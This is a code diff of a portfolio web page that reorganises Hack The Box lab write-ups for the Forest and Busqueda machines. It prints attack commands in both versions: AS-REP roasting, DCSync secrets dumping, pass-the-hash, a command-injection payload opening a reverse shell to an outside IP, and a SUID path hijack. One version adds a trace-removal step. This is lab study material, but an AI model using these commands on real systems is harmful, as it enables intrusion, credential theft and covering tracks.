@@ -290,53 +290,6 @@
         </div>
       </div>
 
-                <!-- CARD: Forest -->
-          <div id="forest" class="bento-box wide" tabindex="0"
-               style="cursor:pointer; padding:0;"
-               data-difficulty="easy" data-tags="ad,dcsync" data-machine="forest"
-               onclick="openDrawer(this,'forest')"
-               onkeydown="if(event.key==='Enter')openDrawer(this,'forest')">
-            <div class="wu-accent easy"></div>
-            <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-              <div>
-                <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d4-b56c-4328-a5c3-0b326d506afe.png"
-                     alt="Forest Icon" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
-                <div class="box-meta">
-                  <span class="tag">AD Exploitation</span>
-                  <span style="font-size:0.85rem;color:var(--neon-green);">
-                    <span class="diff-dot" style="background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);"></span>Easy
-                  </span>
-                </div>
-                <div class="box-title">HTB: Forest</div>
-                <div class="box-desc">AS-REP Roasting → BloodHound enumeration → Exchange Windows Permissions delegation → Full DCSync domain compromise.</div>
-              </div>
-              <div class="box-footer"><span>OS // WINDOWS</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
-            </div>
-          </div>
-          
-          <!-- CARD: Busqueda -->
-          <div id="busqueda" class="bento-box wide" tabindex="0"
-               style="cursor:pointer; padding:0;"
-               data-difficulty="easy" data-tags="web,rce" data-machine="busqueda"
-               onclick="openDrawer(this,'busqueda')"
-               onkeydown="if(event.key==='Enter')openDrawer(this,'busqueda')">
-            <div class="wu-accent easy"></div>
-            <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
-              <div>
-                <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cf-7a40-446d-ae8f-2169885a8b0e.png"
-                     alt="Busqueda Icon" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
-                <div class="box-meta">
-                  <span class="tag">Web RCE</span>
-                  <span style="font-size:0.85rem;color:var(--neon-green);">
-                    <span class="diff-dot" style="background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);"></span>Easy
-                  </span>
-                </div>
-                <div class="box-title">HTB: Busqueda</div>
-                <div class="box-desc">Python Searchor Command Injection → Gitea credential harvesting → SUID bin/bash escalation via system-checkup.py.</div>
-              </div>
-              <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
-            </div>
-      </div>
       <!-- CARD: Facts -->
       <div id="facts" class="bento-box wide" tabindex="0"
            style="cursor:pointer; padding:0;"
@@ -450,7 +403,51 @@
           <div class="box-footer"><span>CAT // CRYPTO</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
         </div>
       </div>
+              <!-- CARD: Forest -->
+      <div id="forest" class="bento-box wide" tabindex="0"
+           style="cursor:pointer; padding:0;"
+           data-difficulty="easy" data-tags="ad,dcsync" data-machine="forest"
+           onclick="openDrawer(this,'forest')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'forest')">
+        <div class="wu-accent easy"></div>
+        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
+          <div>
+            <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d4-b56c-4328-a5c3-0b326d506afe.png"
+                 alt="Forest Icon" style="width:44px;height:44px;border-radius:8px;object-fit:cover;margin-bottom:14px;border:1px solid rgba(168,85,247,0.2);">
+            <div class="box-meta">
+              <span class="tag">AD Exploitation</span>
+              <span style="font-size:0.85rem;color:var(--neon-green);">
+                <span class="diff-dot" style="background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);"></span>Easy
+              </span>
+            </div>
+            <div class="box-title">HTB: Forest</div>
+            <div class="box-desc">AS-REP Roasting → BloodHound → Exchange Permissions → Full DCSync domain compromise.</div>
+          </div>
+          <div class="box-footer"><span>OS // WINDOWS</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
+        </div>
+      </div>
 
+      <!-- CARD: Busqueda -->
+      <div id="busqueda" class="bento-box" tabindex="0"
+           style="cursor:pointer; padding:0;"
+           data-difficulty="easy" data-tags="web,rce" data-machine="busqueda"
+           onclick="openDrawer(this,'busqueda')"
+           onkeydown="if(event.key==='Enter')openDrawer(this,'busqueda')">
+        <div class="wu-accent easy"></div>
+        <div style="padding:28px; display:flex; flex-direction:column; justify-content:space-between; flex:1;">
+          <div>
+            <div class="box-meta">
+              <span class="tag">Web RCE</span>
+              <span style="font-size:0.85rem;color:var(--neon-green);">
+                <span class="diff-dot" style="background:var(--neon-green);box-shadow:0 0 6px var(--neon-green);"></span>Easy
+              </span>
+            </div>
+            <div class="box-title">HTB: Busqueda</div>
+            <div class="box-desc">Python Searchor Command Injection → Gitea credential harvesting → SUID bin/bash escalation.</div>
+          </div>
+          <div class="box-footer"><span>OS // LINUX</span><span style="color:var(--neon-purple);">CLICK TO EXPAND ↓</span></div>
+        </div>
+      </div>
       <!-- CARD: SyncNode (placeholder) -->
       <div id="syncnode" class="bento-box" tabindex="0"
            style="cursor:pointer; padding:0;"
@@ -608,78 +605,7 @@
         { name: "Root Flag", value: "c9d4e1..." }
       ]
     },
-    
-        forest: {
-          title: "HTB: Forest",
-          badge: "Windows // Easy",
-          icon: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d4-b56c-4328-a5c3-0b326d506afe.png",
-          os: "Windows", diff: "Easy", diffColor: "var(--neon-green)",
-          port: "53, 88, 389, 445, 5985", time: "1h 14m",
-          vector: "AS-REP Roasting → BloodHound → Exchange Permissions → DCSync",
-          hasFullWriteup: true,
-          nodes: [
-            {
-              phase: "RECONNAISSANCE", title: "AD Environment Assessment",
-              body: "Initial scan identified a standard Windows Server 2016 DC. Null-session SMB enumeration and standard Kerberoasting yielded no immediate results. Pivoted to LDAP null-bind user extraction to hunt for accounts lacking Pre-Auth.",
-              code: "rustscan -a 10.129.95.210\nnxc smb 10.129.95.210 -d htb.local --users\nnxc ldap 10.129.95.210 -u users.txt -p '' --asreproast asrep.txt"
-            },
-            {
-              phase: "INITIAL ACCESS", title: "Credential Extraction",
-              body: "Successfully performed AS-REP Roasting on `svc-alfresco`. Cracked the resulting hash via John the Ripper and established a WinRM session for internal discovery.",
-              code: "john --format=krb5asrep asrep.txt --wordlist=rockyou.txt\nevil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice"
-            },
-            {
-              phase: "LATERAL MOVEMENT", title: "Attack Path Audit",
-              body: "Deployed SharpHound to map domain relationships. Analysis revealed `svc-alfresco` held 'WriteDacl' and 'GenericAll' over the 'Exchange Windows Permissions' group, an artifact of AD misconfiguration.",
-              code: "Invoke-SharpHound -CollectionMethod All -ZipFileName forest.zip\n# BloodHound Edge: svc-alfresco -> Exchange Windows Permissions"
-            },
-            {
-              phase: "PRIVILEGE ESCALATION", title: "DCSync & Secrets Dumping",
-              body: "After failing simple `net group` membership injection, I leveraged `dacledit.py` to write the DCSync right to the user principal. Executed `secretsdump` to pull the Domain Admin NTLM hash.",
-              code: "impacket-dacledit -action write -rights DCSync -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' ...\nimpacket-secretsdump 'HTB.LOCAL/svc-alfresco':'s3rvice'@10.129.95.210"
-            },
-            {
-              phase: "LESSONS LEARNED", title: "Security Hardening",
-              body: "1) Disable Pre-Auth for non-essential accounts. 2) Implement Tiered Admin models to isolate DC access. 3) Audit Exchange group DACLs periodically to prevent permission creep.",
-              code: "vulnerability: 'AD-ACL-Misconfiguration-DCSync'\nremediation: 'Implement strict Tiered Administrative models and audit GPO/DACL inheritance.'"
-            }
-          ],
-          flags: [{ name: "User", value: "8aa9766a33931db9343fcc0231fdf1c4" }, { name: "Root", value: "520976b5606acbd0c863584c80a9cd08" }]
-        },
-      
-        busqueda: {
-          title: "HTB: Busqueda",
-          badge: "Linux // Easy",
-          icon: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cf-7a40-446d-ae8f-2169885a8b0e.png",
-          os: "Linux", diff: "Easy", diffColor: "var(--neon-green)",
-          port: "22, 80", time: "1h 13m",
-          vector: "Web Command Injection → Gitea Creds → SUID Path Hijacking",
-          hasFullWriteup: true,
-          nodes: [
-            {
-              phase: "INITIAL ACCESS", title: "Command Injection (Searchor 2.4.0)",
-              body: "Identified command injection in the 'query' parameter of the Searchor module. Crafted a JSON-encoded payload to trigger a reverse shell.",
-              code: "curl -s -X POST searcher.htb/search -d 'engine=Google&query=...',__import__('os').system('bash -i >& /dev/tcp/10.10.14.237/4444 0>&1')) #'"
-            },
-            {
-              phase: "ENUMERATION", title: "Gitea Credential Harvesting",
-              body: "Discovered hardcoded credentials in `/var/www/app/.git/config`. Used these to authenticate to the local Gitea instance and enumerated Docker environment variables for admin secrets.",
-              code: "grep -r 'cody' /var/www/app/.git/config\nsudo -S /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect gitea"
-            },
-            {
-              phase: "PRIVILEGE ESCALATION", title: "Path Hijacking (RCE)",
-              body: "System checkup script utilized a relative path. Created a malicious `full-checkup.sh` script in `/tmp`, then executed it via the Python utility to gain SUID root access.",
-              code: "echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/full-checkup.sh\nsudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n/bin/bash -p"
-            },
-            {
-              phase: "LESSONS LEARNED", title: "Security Hardening",
-              body: "1) Always use absolute paths in system scripts. 2) Sanitize user input in Python web apps (`shlex.quote` or library-native functions). 3) Regularly audit Gitea/Git configs for accidental credential leaks.",
-              code: "vulnerability: 'Insecure Path Reference / Input Injection'\nremediation: 'Use absolute file paths in scripts; implement input sanitization for all subprocess calls.'"
-            }
-          ],
-          flags: [{ name: "User", value: "efbfaf09607dc9023acaf9b17be07049" }, { name: "Root", value: "TBD" }]
-        }
-      },
+
     reactor: {
       title: "HTB: Reactor",
       badge: "Linux // Hard",
@@ -755,7 +681,43 @@
         { name: "Root Flag", value: "b5fc76d1..." }
       ]
     },
+    forest: {
+      title: "HTB: Forest",
+      badge: "Windows // Easy",
+      icon: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90d4-b56c-4328-a5c3-0b326d506afe.png",
+      os: "Windows", diff: "Easy", diffColor: "var(--neon-green)",
+      port: "53, 88, 389, 445, 5985", time: "1h 14m",
+      vector: "AS-REP Roasting → BloodHound → Exchange Permissions → DCSync",
+      hasFullWriteup: true,
+      nodes: [
+        { phase: "RECONNAISSANCE", title: "AD Enumeration", body: "Initial scanning confirmed Domain Controller roles. Attempted Kerberoasting which yielded no SPNs. Pivoted to LDAP null-bind user extraction to identify users without Pre-Auth.", code: "nxc ldap 10.129.95.210 -u users.txt -p '' --asreproast asrep.txt" },
+        { phase: "INITIAL ACCESS", title: "AS-REP Roasting", body: "Cracked svc-alfresco hash via John. Validated entry via WinRM and deployed SharpHound for internal path enumeration.", code: "john --format=krb5asrep asrep.txt --wordlist=rockyou.txt\nevil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice" },
+        { phase: "LATERAL MOVEMENT", title: "BloodHound Path Analysis", body: "Analyzed SharpHound data: svc-alfresco -> Exchange Windows Permissions group. This group holds powerful ACLs over the domain object.", code: "Invoke-SharpHound -CollectionMethod All -ZipFileName forest.zip" },
+        { phase: "PRIVILEGE ESCALATION", title: "DCSync Execution", body: "Failed simple group addition. Used dacledit.py to write DCSync rights to svc-alfresco. Dumped NTDS.dit for all domain hashes.", code: "impacket-dacledit -action write -rights DCSync -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL'\nimpacket-secretsdump 'HTB.LOCAL/svc-alfresco':'s3rvice'@10.129.95.210" },
+        { phase: "VERIFICATION", title: "Flag Capture", body: "Used the Administrator hash for Pass-the-Hash (PtH) to verify full domain compromise.", code: "evil-winrm -i 10.129.95.210 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'" },
+        { phase: "LESSONS LEARNED", title: "Remediation", body: "1) Disable Pre-Auth for all accounts. 2) Tighten 'Exchange Windows Permissions' group membership. 3) Monitor for DCSync activities (Event ID 4662).", code: "vulnerability: 'AD-ACL-Misconfiguration'" }
+      ],
+      flags: [{ name: "User", value: "8aa9766a..." }, { name: "Root", value: "520976b5..." }]
+    },
 
+    busqueda: {
+      title: "HTB: Busqueda",
+      badge: "Linux // Easy",
+      icon: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cf-7a40-446d-ae8f-2169885a8b0e.png",
+      os: "Linux", diff: "Easy", diffColor: "var(--neon-green)",
+      port: "22, 80", time: "1h 13m",
+      vector: "Web Command Injection → Gitea Creds → SUID Path Hijacking",
+      hasFullWriteup: true,
+      nodes: [
+        { phase: "RECONNAISSANCE", title: "WebApp Fingerprinting", body: "Identified Searchor 2.4.0 instance. Research confirmed known command injection vulnerabilities in the search query parameter.", code: "nmap -sV -p 80 searcher.htb" },
+        { phase: "INITIAL ACCESS", title: "Command Injection RCE", body: "Exploited Searchor to execute a reverse shell. Successfully established a stable session as the web-user.", code: "curl -s -X POST searcher.htb/search -d 'engine=Google&query=...,__import__('os').system('bash -i >& /dev/tcp/10.10.14.237/4444 0>&1')) #'" },
+        { phase: "ENUMERATION", title: "Git Config & Docker", body: "Found hardcoded credentials in hidden .git/config. Used these to access local Gitea instance and enumerated Docker configs.", code: "grep -r 'cody' /var/www/app/.git/config\n/usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect gitea" },
+        { phase: "PRIVILEGE ESCALATION", title: "SUID Binary Hijack", body: "Discovered system-checkup.py used relative path referencing. Created a malicious shim in /tmp and executed to escalate to root.", code: "echo '#!/bin/bash\nchmod +s /bin/bash' > /tmp/full-checkup.sh\nsudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup" },
+        { phase: "CLEANUP & REPORTING", title: "Evidence Removal", body: "Removed the malicious /tmp shim and the reverse shell process to prevent leaving traces.", code: "rm /tmp/full-checkup.sh\nkill -9 $(pgrep bash)" },
+        { phase: "LESSONS LEARNED", title: "Security Hardening", body: "1) Sanitize inputs using shlex.quote. 2) Use absolute paths in system scripts. 3) Disable sensitive Git folders in web roots.", code: "vulnerability: 'Path Injection / RCE'" }
+      ],
+      flags: [{ name: "User", value: "efbfaf09..." }, { name: "Root", value: "TBD" }]
+    },
     cryptoforge: {
       title: "CryptoForge Matrix",
       badge: "Challenge // Hard",
